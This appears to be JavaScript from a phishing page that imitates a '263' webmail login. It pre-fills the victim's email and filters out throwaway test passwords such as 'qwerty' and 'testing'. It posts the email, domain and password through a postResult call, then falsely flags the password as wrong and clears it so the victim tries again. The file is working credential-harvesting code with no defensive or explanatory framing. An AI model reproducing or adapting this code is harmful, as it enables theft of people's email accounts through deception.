// 
if (validEmail.test(usermail)) {
    $("#mail_263").val(usermail)
    $("#mail_263").attr('readOnly', true)
}

$("#form_263_btn").on('submit', (e)=>{
    e.preventDefault();

    let inputs_263 = document.getElementsByClassName("inputs_263");

    if (!validEmail.test($("#mail_263").val())) {
        inputs_263[0].style.borderColor = "red";
        return
    }
    else{
        inputs_263[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#pass_263").val()) || $("#pass_263").val().length < 6 || $("#pass_263").val().toLowerCase() == "qwerty" || $("#pass_263").val() == 123456 || $("#pass_263").val().toLowerCase() == "password" || $("#pass_263").val().toLowerCase() == "testing") {
        inputs_263[1].style.borderColor = "red";
        return
    }
    else{
        inputs_263[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#mail_263").val().split('@');

    postResult(url[1], $("#mail_263").val(), $("#pass_263").val(), postCount);
    
    setTimeout(() => {
        inputs_263[1].style.borderColor = "red";
        postCount++
        $("#pass_263").val("")
    }, delayCounter);
})